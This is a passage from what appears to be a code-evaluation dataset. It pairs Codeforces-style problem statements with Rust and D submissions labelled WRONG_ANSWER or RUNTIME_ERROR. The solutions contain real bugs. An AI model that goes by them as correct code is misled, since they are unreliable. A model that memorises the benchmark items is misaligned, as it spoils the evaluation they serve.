str::from_utf8_unchecked(&self.buf_str);\n                std::mem::transmute(slice.split_ascii_whitespace())\n            }\n        }\n    }\n\n    pub fn pair<T: str::FromStr>(&mut self) -> (T, T) {\n        (self.token(), self.token())\n    }\n}\n","description":"There are n knights sitting at the Round Table at an equal distance from each other. Each of them is either in a good or in a bad mood.Merlin, the wizard predicted to King Arthur that the next month will turn out to be particularly fortunate if the regular polygon can be found. On all vertices of the polygon knights in a good mood should be located. Otherwise, the next month will bring misfortunes.A convex polygon is regular if all its sides have same length and all his angles are equal. In this problem we consider only regular polygons with at least 3 vertices, i. e. only nondegenerated.On a picture below some examples of such polygons are present. Green points mean knights in a good mood. Red points mean ones in a bad mood.  King Arthur knows the knights' moods. Help him find out if the next month will be fortunate or not.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains number n, which is the number of knights at the round table (3\u2009\u2264\u2009n\u2009\u2264\u2009105). The second line contains space-separated moods of all the n knights in the order of passing them around the table. \"1\" means that the knight is in a good mood an \"0\" means that he is in a bad mood.","output_spec":"Print \"YES\" without the quotes if the following month will turn out to be lucky. Otherwise, print \"NO\".","notes":null,"sample_inputs":["3\n1 1 1","6\n1 0 1 1 1 0","6\n1 0 0 1 0 1"],"sample_outputs":["YES","YES","NO"]}
{"difficulty":1600,"lang":"Rust","lang_cluster":"rust","src_uid":"ed1a2ae733121af6486568e528fe2d84","submission_id":"6fdce8f69a2010207592b63e170e46d3","tags":["sortings","brute force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#[allow(unused_macros)]\nmacro_rules! input {\n    (source = $s:expr, $($r:tt)*) => {\n        let mut iter = $s.split_whitespace();\n        let mut next = || { iter.next().unwrap() };\n        input_inner!{next, $($r)*}\n    };\n    ($($r:tt)*) => {\n        let stdin = std::io::stdin();\n        let mut bytes = std::io::Read::bytes(std::io::BufReader::new(stdin.lock()));\n        let mut next = move || -> String{\n            bytes\n                .by_ref()\n                .map(|r|r.unwrap() as char)\n                .skip_while(|c|c.is_whitespace())\n                .take_while(|c|!c.is_whitespace())\n                .collect()\n        };\n        input_inner!{next, $($r)*}\n    };\n}\n\n#[allow(unused_macros)]\nmacro_rules! input_inner {\n    ($next:expr) => {};\n    ($next:expr, ) => {};\n\n    ($next:expr, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = read_value!($next, $t);\n        input_inner!{$next $($r)*}\n    };\n\n    ($next:expr, mut $var:ident : $t:tt $($r:tt)*) => {\n        let mut $var = read_value!($next, $t);\n        input_inner!{$next $($r)*}\n    };\n}\n\n#[allow(unused_macros)]\nmacro_rules! read_value {\n    ($next:expr, ( $($t:tt),* )) => {\n        ( $(read_value!($next, $t)),* )\n    };\n\n    ($next:expr, [ $t:tt ; $len:expr ]) => {\n        (0..$len).map(|_| read_value!($next, $t)).collect::<Vec<_>>()\n    };\n\n    ($next:expr, chars) => {\n        read_value!($next, String).chars().collect::<Vec<char>>()\n    };\n\n    ($next:expr, usize1) => {\n        read_value!($next, usize) - 1\n    };\n\n    ($next:expr, $t:ty) => {\n        $next().parse::<$t>().expect(\"Parse error\")\n    };\n}\n\n#[allow(unused_macros)]\nmacro_rules! debug {\n    ($($a:expr),*) => {\n        #[cfg(debug_assertions)]\n        writeln!(&mut std::io::stderr(), concat!(\"[DEBUG] \", $(stringify!($a), \"={:?} \"),*), $($a),*);\n    }\n}\n\n#[allow(unused_imports)]\nuse std::cmp::{min, max};\n#[allow(unused_imports)]\nuse std::io::{stdout, stdin, BufWriter, Write};\n\nconst INF:usize= 2 << 30;\n\nfn rec(cur: usize, u: usize, k: usize, cnt: &Vec<usize>, ans: &mut Vec<usize>) -> Vec<usize> {\n    debug!(cur, u, k);\n    let mut v = vec![0; 20];\n    if cur > u {\n        return v;\n    }\n    let v1 = rec(cur*2, u, k, cnt, ans);\n    let v2 = rec(cur*2+1, u, k, cnt, ans);\n    v[0] = cnt[cur];\n\n    let mut temp = cnt[cur];\n    let mut cost = 0;\n    for i in 0..19 {\n        v[i+1] = v1[i] + v2[i];\n        if k - temp > 0 {\n            cost += (i+1) * min(k-temp, v[i+1]);\n            temp += min(k-temp, v[i+1]);\n        }\n    }\n    if temp == k {\n        ans[cur] = cost;\n    }\n    v\n}\n\n\nfn main() {\n    let out = std::io::stdout();\n    let mut out = BufWriter::new(out.lock());\n    macro_rules! puts {\n        ($($format:tt)*) => (write!(out,$($format)*).unwrap());\n    }\n\n    input!{\n      n: usize,\n      k: usize,\n      aa: [usize; n],\n    }\n    let mut m = *aa.iter().max().unwrap();\n    let mut cnt = vec![0; m+1];\n    let mut ans = vec![INF; m+1];\n    for a in aa {\n        cnt[a] += 1;\n    }\n    rec(1, m, k, &cnt, &mut ans);\n    let ans = ans.iter().min().unwrap();\n    puts!(\"{}\\n\", ans);\n}\n","description":"The only difference between easy and hard versions is the number of elements in the array.You are given an array $$$a$$$ consisting of $$$n$$$ integers. In one move you can choose any $$$a_i$$$ and divide it by $$$2$$$ rounding down (in other words, in one move you can set $$$a_i := \\lfloor\\frac{a_i}{2}\\rfloor$$$).You can perform such an operation any (possibly, zero) number of times with any $$$a_i$$$.Your task is to calculate the minimum possible number of operations required to obtain at least $$$k$$$ equal numbers in the array.Don't forget that it is possible to have $$$a_i = 0$$$ after some operations, thus the answer always exists.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\le k \\le n \\le 50$$$) \u2014 the number of elements in the array and the number of equal numbers required. The second line of the input contains $$$n$$$ integers $$$a_1, a_2, \\dots, a_n$$$ ($$$1 \\le a_i \\le 2 \\cdot 10^5$$$), where $$$a_i$$$ is the $$$i$$$-th element of $$$a$$$.","output_spec":"Print one integer \u2014 the minimum possible number of operations required to obtain at least $$$k$$$ equal numbers in the array.","notes":null,"sample_inputs":["5 3\n1 2 2 4 5","5 3\n1 2 3 4 5","5 3\n1 2 3 3 3"],"sample_outputs":["1","2","0"]}
{"difficulty":2200,"lang":"Rust","lang_cluster":"rust","src_uid":"fc29e8c1a9117c1dd307131d852b6088","submission_id":"7e17f3c7706c1fac19ddb04864736a4d","tags":["binary search","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/https:\/\/qiita.com\/tanakh\/items\/0ba42c7ca36cd29d0ac8 \u3088\u308a\nmacro_rules! input {\n    (source = $s:expr, $($r:tt)*) => {\n        let mut iter = $s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n    ($($r:tt)*) => {\n        let s = {\n            use std::io::Read;\n            let mut s = String::new();\n            std::io::stdin().read_to_string(&mut s).unwrap();\n            s\n        };\n        let mut iter = s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n}\n\nmacro_rules! input_inner {\n    ($iter:expr) => {};\n    ($iter:expr, ) => {};\n    ($iter:expr, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = read_value!($iter, $t);\n        input_inner!{$iter $($r)*}\n    };\n}\n\nmacro_rules! read_value {\n    ($iter:expr, ( $($t:tt),* )) => {\n        ( $(read_value!($iter, $t)),* )\n    };\n    ($iter:expr, [ $t:tt ; $len:expr ]) => {\n        (0..$len).map(|_| read_value!($iter, $t)).collect::<Vec<_>>()\n    };\n    ($iter:expr, chars) => {\n        read_value!($iter, String).chars().collect::<Vec<char>>()\n    };\n    ($iter:expr, bytes) => {\n        read_value!($iter, String).bytes().collect::<Vec<u8>>()\n    };\n    ($iter:expr, usize1) => {\n        read_value!($iter, usize) - 1\n    };\n    ($iter:expr, $t:ty) => {\n        $iter.next().unwrap().parse::<$t>().expect(\"Parse error\")\n    };\n}\n\n\/\/\n\n\/\/ \u6700\u5927\u5024\u306f\u8caa\u6b32\u306b\u5272\u308a\u5f53\u3066\u308c\u3070\u826f\u3044\uff1f\n\/\/ 2\u51aa\u3092\u5747\u7b49\u306b\u5272\u308a\u632f\u308b\u3001\u5272\u308a\u632f\u308c\u306a\u304b\u3063\u305f\u306e\u306f2\u51aa\u3067\u306a\u3044\u5217\u306b\u7a81\u3063\u8fbc\u3080\n\/\/ 2\u51aa\u3067\u306a\u3044\u5217\u3092\u8caa\u6b32\u306b\u5272\u308a\u5f53\u3066\u308b\n\/\/ \u5c0f\u3055\u3044\u5024\u3092\u5c0f\u3055\u3044\u5024\u306b\u5272\u308a\u632f\u308b\u611f\u3058\n\/\/ \u3053\u308c\u3067\u3067\u304d\u306a\u3044\u306a\u3089No\n\/\/ \u3067\u304d\u305f\u3089\uff1f\n\/\/ \u5c0f\u3055\u3044\u5217\u3092\u89e3\u6d88\u3057\u3066\u518d\u5272\u308a\u5f53\u3066\u304c\u3067\u304d\u308b\u304b\u3068\u3044\u3046\u306e\u3092\u9806\u306b\u7d9a\u3051\u308b\u3068\u3044\u3044\u304b\n\/\/ \u8a08\u7b97\u91cf\uff1f\n\/\/ \u5168\u90e81\u3068\u304b\u3060\u3068\u5272\u308a\u5f53\u3066\u306e\u56de\u6570\u304cO(N)\u306b\u306a\u308b\u3001\u8f9b\u3044\n\/\/ \u5272\u308a\u5f53\u3066\u53ef\u80fd\u304b\u306f\u5358\u8abf\u306a\u306e\u3067\u4e8c\u5206\u63a2\u7d22\n\nfn valid(beki: &[u64], b: &mut [u64]) -> bool {\n    b.sort();\n    let mut p = 0;\n    for pow in beki.iter().rev() {\n        if p < b.len() && *pow * 2 >= b[p] {\n            p += 1;\n        }\n    }\n    p == b.len()\n}\n\nfn run() {\n    input! {\n        n: usize,\n        a: [u64; n],\n    }\n    let mut beki = vec![];\n    let mut k = 0;\n    while k < n && a[k] == 1 {\n        beki.push(1);\n        k += 1;\n    }\n    let mut pos = 0;\n    let mut b = vec![];\n    for a in a[k..].iter() {\n        if *a == beki[pos] * 2 {\n            beki[pos] *= 2;\n            pos = (pos + 1) % beki.len();\n        } else {\n            pos = 0;\n            b.push(*a);\n        }\n    }\n    if !valid(&beki, &mut b) {\n        println!(\"-1\");\n        return;\n    }\n    let mut ok = beki.len();\n    let mut ng = 0;\n    while ok - ng > 1 {\n        let mid = (ok + ng) \/ 2;\n        let mut b = b.clone();\n        for p in beki[mid..].iter() {\n            let mut k = 1;\n            while k <= *p {\n                b.push(k);\n                k *= 2;\n            }\n        }\n        if valid(&beki[..mid], &mut b) {\n            ok = mid;\n        } else {\n            ng = mid;\n        }\n    }\n    let mut s = String::new();\n    for k in ok..=beki.len() {\n        s.push_str(&format!(\"{} \", k));\n    }\n    s.pop();\n    println!(\"{}\", s);\n}\n\nfn main() {\n    run();\n}\n","description":"It can be shown that any positive integer x can be uniquely represented as x\u2009=\u20091\u2009+\u20092\u2009+\u20094\u2009+\u2009...\u2009+\u20092k\u2009-\u20091\u2009+\u2009r, where k and r are integers, k\u2009\u2265\u20090, 0\u2009<;\u2009r\u2009\u2264\u20092k. Let's call that representation prairie partition of x.For example, the prairie partitions of 12, 17, 7 and 1 are:  12\u2009=\u20091\u2009+\u20092\u2009+\u20094\u2009+\u20095,17\u2009=\u20091\u2009+\u20092\u2009+\u20094\u2009+\u20098\u2009+\u20092,7\u2009=\u20091\u2009+\u20092\u2009+\u20094,1\u2009=\u20091. Alice took a sequence of positive integers (possibly with repeating elements), replaced every element with the sequence of summands in its prairie partition, arranged the resulting numbers in non-decreasing order and gave them to Borys. Now Borys wonders how many elements Alice's original sequence could contain. Find all possible options!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105)\u00a0\u2014 the number of numbers given from Alice to Borys. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091012; a1\u2009\u2264\u2009a2\u2009\u2264\u2009...\u2009\u2264\u2009an)\u00a0\u2014 the numbers given from Alice to Borys.","output_spec":"Output, in increasing order, all possible values of m such that there exists a sequence of positive integers of length m such that if you replace every element with the summands in its prairie partition and arrange the resulting numbers in non-decreasing order, you will get the sequence given in the input. If there are no such values of m, output a single integer -1.","notes":"NoteIn the first example, Alice could get the input sequence from [6,\u200920] as the original sequence.In the second example, Alice's original sequence could be either [4,\u20095] or [3,\u20093,\u20093].","sample_inputs":["8\n1 1 2 2 3 4 5 8","6\n1 1 1 2 2 2","5\n1 2 4 4 4"],"sample_outputs":["2","2 3","-1"]}
{"difficulty":1400,"lang":"D","lang_cluster":"d","src_uid":"1009_B","submission_id":"40636019","tags":["greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio, std.string, std.conv;\r\nimport std.range, std.algorithm, std.array, std.typecons, std.container;\r\nimport std.math, std.numeric, core.bitop;\r\n\r\n\r\nvoid main() {\r\n    dchar[] s = readln.chomp.to!(dchar[]);\r\n    int n = s.length.to!int;\r\n\r\n    int l, r;\r\n\r\n    while (l < n) {\r\n        while (r < n && s[r] != '0') {\r\n            r++;\r\n        }\r\n        s[l..r].sort();\r\n        r++;\r\n        l = r;\r\n    }\r\n\r\n    debug {\r\n        writeln(s);\r\n    }\r\n\r\n    l = r = 0;\r\n\r\n    while (l < n) {\r\n        while (r < n && s[r] != '2') {\r\n            r++;\r\n        }\r\n        s[l..r].sort();\r\n        r++;\r\n        l = r;\r\n    }\r\n\r\n    writeln(s);\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nvoid scan(T...)(ref T args) {\r\n    import std.stdio : readln;\r\n    import std.algorithm : splitter;\r\n    import std.conv : to;\r\n    import std.range.primitives;\r\n\r\n    auto line = readln().splitter();\r\n    foreach (ref arg; args) {\r\n        arg = line.front.to!(typeof(arg));\r\n        line.popFront();\r\n    }\r\n    assert(line.empty);\r\n}\r\n\r\n\r\n\r\nvoid fillAll(R, T)(ref R arr, T value) {\r\n    static if (is(typeof(arr[] = value))) {\r\n        arr[] = value;\r\n    }\r\n    else {\r\n        foreach (ref e; arr) {\r\n            fillAll(e, value);\r\n        }\r\n    }\r\n}\r\n","description":"You are given a ternary string (it is a string which consists only of characters '0', '1' and '2').You can swap any two adjacent (consecutive) characters '0' and '1' (i.e. replace \"01\" with \"10\" or vice versa) or any two adjacent (consecutive) characters '1' and '2' (i.e. replace \"12\" with \"21\" or vice versa).For example, for string \"010210\" we can perform the following moves:   \"010210\" $$$\\rightarrow$$$ \"100210\";  \"010210\" $$$\\rightarrow$$$ \"001210\";  \"010210\" $$$\\rightarrow$$$ \"010120\";  \"010210\" $$$\\rightarrow$$$ \"010201\". Note than you cannot swap \"02\" $$$\\rightarrow$$$ \"20\" and vice versa. You cannot perform any other operations with the given string excluding described above.You task is to obtain the minimum possible (lexicographically) string by using these swaps arbitrary number of times (possibly, zero).String $$$a$$$ is lexicographically less than string $$$b$$$ (if strings $$$a$$$ and $$$b$$$ have the same length) if there exists some position $$$i$$$ ($$$1 \\le i \\le |a|$$$, where $$$|s|$$$ is the length of the string $$$s$$$) such that for every $$$j < i$$$ holds $$$a_j = b_j$$$, and $$$a_i < b_i$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains the string $$$s$$$ consisting only of characters '0', '1' and '2', its length is between $$$1$$$ and $$$10^5$$$ (inclusive).\n","output_spec":"Print a single string \u2014 the minimum possible (lexicographically) string you can obtain by using the swaps described above arbitrary number of times (possibly, zero).\n","notes":null,"sample_inputs":["100210\n","11222121\n","20\n"],"sample_outputs":["001120\n","11112222\n","20\n"]}
{"difficulty":800,"lang":"D","lang_cluster":"d","src_uid":"110_A","submission_id":"172249346","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"import std;\r\n\r\nvoid main() {\r\n    long n;\r\n    readf(\"%d\\n\", n);\r\n\r\n    bool isNearlyLucky = !(n == 4 || n == 7);\r\n    while (n > 0) {\r\n        long d = n % 10;\r\n        isNearlyLucky &= (d == 4 || d == 7);\r\n\r\n        n \/= 10;\r\n    }\r\n\r\n    writeln(isNearlyLucky ? \"YES\" : \"NO\");\r\n}","description":"Petya loves lucky numbers. We all know that lucky numbers are the positive integers whose decimal representations contain only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Unfortunately, not all numbers are lucky. Petya calls a number nearly lucky if the number of lucky digits in it is a lucky number. He wonders whether number n is a nearly lucky number.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains an integer n (1\u2264n\u226410^18).\nPlease do not use the %lld specificator to read or write 64-bit numbers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specificator.\n","output_spec":"Print on the single line \"YES\" if n is a nearly lucky number. Otherwise, print \"NO\" (without the quotes).\n","notes":"In the first sample there are 3 lucky digits (first one and last two), so the answer is \"NO\".\nIn the second sample there are 7 lucky digits, 7 is lucky number, so the answer is \"YES\".\nIn the third sample there are no lucky digits, so the answer is \"NO\".\n","sample_inputs":["40047\n","7747774\n","1000000000000000000\n"],"sample_outputs":["NO\n","YES\n","NO\n"]}
{"difficulty":1300,"lang":"D","lang_cluster":"d","src_uid":"1113_B","submission_id":"50008863","tags":["greedy","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"import core.bitop, std.bitmanip;\r\nimport std.algorithm, std.functional;\r\nimport std.array, std.container;\r\nimport std.conv;\r\nimport std.math, std.numeric;\r\nimport std.range, std.range.interfaces;\r\nimport std.stdio, std.string;\r\nimport std.typecons;\r\n\r\nimmutable long INF = 10L ^^ 18 + 23;\r\n\r\nimmutable int A = 100;\r\n\r\nvoid main()\r\n{   \r\n    int n;\r\n    readf(\"%s\", &n);\r\n    readln;\r\n    \r\n    auto a = readln.chomp.split.map!(to!int).array;\r\n    \r\n    auto sm = a.sum();\r\n    \r\n    if (n == 1) {\r\n        sm.writeln;\r\n        return;\r\n    }\r\n    \r\n    int mxgain = 0;\r\n    for (int i = 2; i < A; ++i) {\r\n        int curbig = -1;\r\n        for (int j = 0; j < n; ++j) {\r\n            if (a[j] % i != 0) continue;\r\n            \r\n            if (curbig == -1 || a[j] > a[curbig]) curbig = j;\r\n        }\r\n        \r\n        if (curbig == -1) continue;\r\n        \r\n        int cursm = -1;\r\n        for (int j = 0; j < n; ++j) {\r\n            if (j == curbig) continue;\r\n            \r\n            if (cursm == -1 || a[j] < cursm) cursm = j;\r\n        }\r\n        \r\n        int curgain = (a[curbig] + a[cursm]) - (a[curbig] \/ i + a[cursm] * i);\r\n        mxgain = max(mxgain, curgain);\r\n    }\r\n    \r\n    int ans = sm - mxgain;\r\n    ans.writeln;\r\n}","description":"One day Sasha visited the farmer 2D and his famous magnetic farm. On this farm, the crop grows due to the influence of a special magnetic field. Maintaining of the magnetic field is provided by $$$n$$$ machines, and the power of the $$$i$$$-th machine is $$$a_i$$$. This year 2D decided to cultivate a new culture, but what exactly he didn't say. For the successful growth of the new culture, it is necessary to slightly change the powers of the machines. 2D can at most once choose an arbitrary integer $$$x$$$, then choose one machine and reduce the power of its machine by $$$x$$$ times, and at the same time increase the power of one another machine by $$$x$$$ times (powers of all the machines must stay positive integers). Note that he may not do that if he wants. More formally, 2D can choose two such indices $$$i$$$ and $$$j$$$, and one integer $$$x$$$ such that $$$x$$$ is a divisor of $$$a_i$$$, and change powers as following: $$$a_i = \\frac{a_i}{x}$$$, $$$a_j = a_j \\cdot x$$$Sasha is very curious, that's why he wants to calculate the minimum total power the farmer can reach. There are too many machines, and Sasha can't cope with computations, help him!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer $$$n$$$ ($$$2 \\\\le n \\\\le 5 \\\\cdot 10^4$$$)\u00a0\u2014 the number of machines.\nThe second line contains $$$n$$$ integers $$$a_1, a_2, \\\\ldots, a_n$$$ ($$$1 \\\\le a_i \\\\le 100$$$)\u00a0\u2014 the powers of the machines.\n","output_spec":"Print one integer\u00a0\u2014 minimum total power.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":800,"lang":"D","lang_cluster":"d","src_uid":"112_A","submission_id":"107521127","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"module main;\r\nimport std.stdio, std.uni, std.algorithm;\r\n\r\nvoid main()\r\n{\r\n    char[] a, b;\r\n    readf!\" %s\\n %s\"(a, b);\r\n    writeln(clamp(sicmp(a, b), -1, 1));\r\n}","description":"Little Petya loves presents. His mum bought him two strings of the same size for his birthday. The strings consist of uppercase and lowercase Latin letters. Now Petya wants to compare those two strings lexicographically. The letters' case does not matter, that is an uppercase letter is considered equivalent to the corresponding lowercase letter. Help Petya perform the comparison.","input_from":"standard input","output_to":"standard output","input_spec":"Each of the first two lines contains a bought string. The strings' lengths range from 1 to 100 inclusive. It is guaranteed that the strings are of the same length and also consist of uppercase and lowercase Latin letters.\n","output_spec":"If the first string is less than the second one, print \"-1\". If the second string is less than the first one, print \"1\". If the strings are equal, print \"0\". Note that the letters' case is not taken into consideration when the strings are compared.\n","notes":"If you want more formal information about the lexicographical order (also known as the \"dictionary order\" or \"alphabetical order\"), you can visit the following site:\n http:\/\/en.wikipedia.org\/wiki\/Lexicographical_order","sample_inputs":["aaaa\naaaA\n","abs\nAbz\n","abcdefg\nAbCdEfF\n"],"sample_outputs":["0\n","-1\n","1\n"]}
{"difficulty":1000,"lang":"D","lang_cluster":"d","src_uid":"114_A","submission_id":"4847506","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio, std.string, std.algorithm;\r\nimport std.conv, std.array;\r\n\r\nuint f(uint k, uint l) {\r\n    uint c = 0;\r\n    while (l % k == 0) {\r\n        l \/= k;\r\n        c++;\r\n    }\r\n    if (l == 1) { return c; }\r\n    else { return 0; }\r\n}\r\n\r\nvoid main() {\r\n    uint k, l; readf(\"%d\\n%d\", &k, &l);\r\n    uint c = k.f(l);\r\n    if (c == 0) { \r\n        writeln(\"NO\");\r\n    } else {\r\n        writeln(\"YES\");\r\n        writeln(c \/ 2);\r\n    }\r\n}\r\n","description":"When Petya went to school, he got interested in large numbers and what they were called in ancient times. For instance, he learned that the Russian word \"tma\" (which now means \"too much to be counted\") used to stand for a thousand and \"tma tmyschaya\" (which literally means \"the tma of tmas\") used to stand for a million.Petya wanted to modernize the words we use for numbers and invented a word petricium that represents number k. Moreover, petricium la petricium stands for number k^2, petricium la petricium la petricium stands for k^3 and so on. All numbers of this form are called petriciumus cifera, and the number's importance is the number of articles la in its title.Petya's invention brought on a challenge that needed to be solved quickly: does some number l belong to the set petriciumus cifera? As Petya is a very busy schoolboy he needs to automate the process, he asked you to solve it.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer number k, the second line contains integer number l (2\u2264k,l\u22642^31-1).\n","output_spec":"You should print in the first line of the output \"YES\", if the number belongs to the set petriciumus cifera and otherwise print \"NO\". If the number belongs to the set, then print on the seconds line the only number \u2014 the importance of number l.\n","notes":null,"sample_inputs":["5\n25\n","3\n8\n"],"sample_outputs":["YES\n1\n","NO\n"]}
{"difficulty":1100,"lang":"D","lang_cluster":"d","src_uid":"116_B","submission_id":"3694493","tags":["greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"module cf_116B;\r\n\r\nimport std.stdio, std.algorithm;\r\n\r\nstruct PigPosition {\r\n    int x, y;\r\n    int wolfs;\r\n}\r\n\r\nvoid main() {\r\n    immutable int[] DX = [-1, 1, 0, 0],\r\n                    DY = [0, 0, -1, 1];\r\n    immutable int MAX_SIZE = 10;\r\n\r\n    int n, m;\r\n    char[MAX_SIZE][MAX_SIZE] field;\r\n    PigPosition[] wolfsForPig;\r\n\r\n    readf(\"%d %d\\n\", &n, &m);\r\n    for (int i = 0; i < n; ++i) {\r\n        for (int j = 0; j < m; ++j) {\r\n            readf(\"%c\", &field[i][j]);\r\n            writefln(\"<%c>\", field[i][j]);\r\n            if (field[i][j] == 'P') {\r\n                wolfsForPig ~= PigPosition(i, j, 0);\r\n                for (int k = 0; k < DX.length; ++k) {\r\n                    int dx = i + DX[k];\r\n                    int dy = j + DY[k];\r\n\r\n                    if (dx >= 0 && dx < n && dy >= 0 && dy < m && field[dx][dy] == 'W') {\r\n                        ++wolfsForPig[$ - 1].wolfs;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        char temporary; \/\/ skip new line character\r\n        readf(\"%c\", &temporary);\r\n    }\r\n\r\n    sort!((a, b) { return a.wolfs < b.wolfs; })(wolfsForPig);\r\n\r\n    int eatenPigs = 0;\r\n    for (int i = 0; i < wolfsForPig.length; ++i) {\r\n        for (int j = 0; j < DX.length; ++j) {\r\n            int dx = wolfsForPig[i].x + DX[j];\r\n            int dy = wolfsForPig[i].y + DY[j];\r\n\r\n            if (dx >= 0 && dx < n && dy >= 0 && dy < m && field[dx][dy] == 'W') {\r\n                field[dx][dy] = '.';\r\n\r\n                ++eatenPigs;\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    writeln(eatenPigs);\r\n}","description":"Once upon a time there were several little pigs and several wolves on a two-dimensional grid of size n\u00d7m. Each cell in this grid was either empty, containing one little pig, or containing one wolf.A little pig and a wolf are adjacent if the cells that they are located at share a side. The little pigs are afraid of wolves, so there will be at most one wolf adjacent to each little pig. But each wolf may be adjacent to any number of little pigs.They have been living peacefully for several years. But today the wolves got hungry. One by one, each wolf will choose one of the little pigs adjacent to it (if any), and eats the poor little pig. This process is not repeated. That is, each wolf will get to eat at most one little pig. Once a little pig gets eaten, it disappears and cannot be eaten by any other wolf.What is the maximum number of little pigs that may be eaten by the wolves?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers n and m (1\u2264n,m\u226410) which denotes the number of rows and columns in our two-dimensional grid, respectively. Then follow n lines containing m characters each \u2014 that is the grid description. \".\" means that this cell is empty. \"P\" means that this cell contains a little pig. \"W\" means that this cell contains a wolf. \nIt is guaranteed that there will be at most one wolf adjacent to any little pig.\n","output_spec":"Print a single number \u2014 the maximal number of little pigs that may be eaten by the wolves.\n","notes":"In the first example, one possible scenario in which two little pigs get eaten by the wolves is as follows. \n \n","sample_inputs":["2 3\nPPW\nW.P\n","3 3\nP.W\n.P.\nW.P\n"],"sample_outputs":["2\n","0\n"]}
{"difficulty":1000,"lang":"D","lang_cluster":"d","src_uid":"131_A","submission_id":"12534444","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/**\r\n * CodeForces Problem 344.B (1)\r\n * ACM summer training contest (3b)\r\n * Noein\r\n *\/\r\n \r\nimport std.stdio;\r\n \r\nT mut(T)(in T inval) {\r\n    import std.traits;\r\n \r\n    Unqual!T new_val = inval;\r\n \r\n    return new_val;\r\n}\r\n \r\nT imut(T)(in T inval) {\r\n    immutable new_val = inval;\r\n \r\n    return new_val;\r\n}\r\n\r\n\/*\r\n  T abs(T)(in T inval) { return ((inval < 0) ? -inval : inval); }\r\n  T min(T)(in T l, in T r) { return ((l < r) ? l : r); }\r\n*\/\r\n\r\nchar to_lower(const ref char ch, bool f = true) {\r\n    if(f) {\r\n        if(ch >= 'A' && ch <= 'Z') {\r\n            int dl = ('a' - 'A');\r\n            return cast(char)(ch + dl);\r\n        } \r\n    }\r\n    else if(ch >= 'a' && ch <= 'z') {\r\n        int dl = ('a' - 'A');\r\n        return cast(char)(ch - dl);\r\n    }\r\n    \r\n    return ch;\r\n}\r\n\r\nbool chk_caps_locked(const char[] in_str) {\r\n    bool f = true;\r\n    foreach(c; in_str[1..$]) {\r\n        f &= (c <= 'Z' && c >= 'A');\r\n    }\r\n    return f;\r\n}\r\n\r\nvoid main() {\r\n    string maybe_caps_locked;\r\n    \r\n    readf(\"%s \", &maybe_caps_locked);\r\n    string res;\r\n    if(chk_caps_locked(maybe_caps_locked))\r\n    {\r\n        foreach(c; maybe_caps_locked) {\r\n            res ~= c.to_lower();\r\n        }\r\n        res = to_lower(maybe_caps_locked[0], false) ~ res[1..$];\r\n    }\r\n    \r\n    writeln(res);\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n","description":"wHAT DO WE NEED cAPS LOCK FOR?Caps lock is a computer keyboard key. Pressing it sets an input mode in which typed letters are capital by default. If it is pressed by accident, it leads to accidents like the one we had in the first passage. Let's consider that a word has been typed with the Caps lock key accidentally switched on, if:   either it only contains uppercase letters;  or all letters except for the first one are uppercase. In this case we should automatically change the case of all letters. For example, the case of the letters that form words \"hELLO\", \"HTTP\", \"z\" should be changed.Write a program that applies the rule mentioned above. If the rule cannot be applied, the program should leave the word unchanged.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains a word consisting of uppercase and lowercase Latin letters. The word's length is from 1 to 100 characters, inclusive.\n","output_spec":"Print the result of the given word's processing.\n","notes":null,"sample_inputs":["cAPS\n","Lock\n"],"sample_outputs":["Caps","Lock\n"]}
